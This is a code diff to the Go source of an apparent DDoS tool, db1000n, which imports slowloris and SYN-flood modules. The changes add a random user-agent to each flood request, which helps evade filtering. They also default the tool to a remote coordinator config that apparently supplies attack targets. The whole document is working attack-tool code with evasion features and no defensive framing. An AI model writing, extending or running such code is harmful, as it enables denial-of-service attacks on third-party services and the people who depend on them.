@@ -18,13 +18,21 @@ import (
 	"strings"
 	"time"
 
+	"github.com/corpix/uarand"
 	"github.com/google/uuid"
 
 	"db1000n/slowloris"
+
 	"github.com/Arriven/db1000n/synfloodraw"
 
 	"db1000n/logs"
 )
+
+// Init environment
+func initEnvironment() {
+	os.Setenv("CONFIG_PATH", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json")
+	//os.Setenv("CONFIG_PATH", "./config.json")
+}
 
 // JobArgs comment for linter
 type JobArgs = json.RawMessage
@@ -113,6 +121,7 @@ func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 		Body    json.RawMessage
 		Headers map[string]string
 	}
+
 	var jobConfig httpJobConfig
 	err := json.Unmarshal(args, &jobConfig)
 	if err != nil {
@@ -124,6 +133,9 @@ func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 			l.Debug("error creating request: %v", err)
 			continue
 		}
+
+		// Add random user agent
+		req.Header.Set("user-agent", uarand.GetRandom())
 		for key, value := range jobConfig.Headers {
 			req.Header.Add(parseStringTemplate(key), parseStringTemplate(value))
 		}
@@ -326,11 +338,13 @@ func fetchConfig(configPath string) (*Config, error) {
 }
 
 func main() {
+	// Init env variables
+	initEnvironment()
 
 	var configPath string
 	var refreshTimeout time.Duration
 	var logLevel logs.Level
-	flag.StringVar(&configPath, "c", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json", "path to a config file, can be web endpoint")
+	flag.StringVar(&configPath, "c", os.Getenv("CONFIG_PATH"), "path to a config file, can be web endpoint")
 	flag.DurationVar(&refreshTimeout, "r", time.Minute, "refresh timeout for updating the config")
 	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error. Default is Info")
 	flag.Parse()
